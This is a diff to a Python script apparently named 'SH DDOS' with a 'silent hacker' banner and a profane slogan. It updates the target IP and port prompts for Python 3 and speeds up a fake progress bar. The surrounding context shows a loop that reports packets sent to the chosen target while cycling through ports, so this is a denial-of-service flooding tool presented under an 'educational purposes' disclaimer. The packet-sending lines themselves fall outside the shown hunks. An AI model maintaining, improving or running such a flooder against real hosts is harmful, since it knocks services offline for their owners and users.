@@ -22,19 +22,19 @@ os.system("figlet  SH DDOS")
 print("The silent hacker")
 print("Fuck all enemies,hack all fools")
 print("This tool was made for educational purposes")
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+ip = (input("IP Target : "))
+port =int(input("Port       : "))
 
 os.system("clear")
 os.system("figlet Are you ready,Attack Starting")
 print("[                    ] 0% ")
-time.sleep(5)
+time.sleep(1)
 print("[=====               ] 25%")
-time.sleep(5)
+time.sleep(1)
 print("[==========          ] 50%")
-time.sleep(5)
+time.sleep(1)
 print("[===============     ] 75%")
-time.sleep(5)
+time.sleep(1)
 print("[====================] 100%")
 time.sleep(3)
 sent = 0
@@ -45,3 +45,4 @@ while True:
      print("Sent %s packet to %s throught port:%s""%sent,ip,port")
      if port == 65534:
        port = 1
+    
